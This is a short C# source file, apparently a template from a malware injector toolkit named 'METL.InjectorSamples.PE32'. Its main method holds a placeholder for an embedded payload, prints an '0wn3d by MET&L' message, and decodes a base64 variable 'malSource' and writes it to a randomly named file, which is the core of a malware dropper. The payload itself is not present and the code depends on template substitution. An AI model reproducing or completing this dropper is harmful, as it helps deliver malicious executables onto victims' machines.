using System;
using System.IO;

namespace METL.InjectorSamples.PE32
{
    class Program
    {
        static void Main(string[] args)
        {
            [MALWARE_EMBED]

            Console.WriteLine("0wn3d by MET&L on [TIMESTAMP]");

            System.IO.File.WriteAllBytes(Path.GetRandomFileName(), Convert.FromBase64String(malSource));
        }
    }
}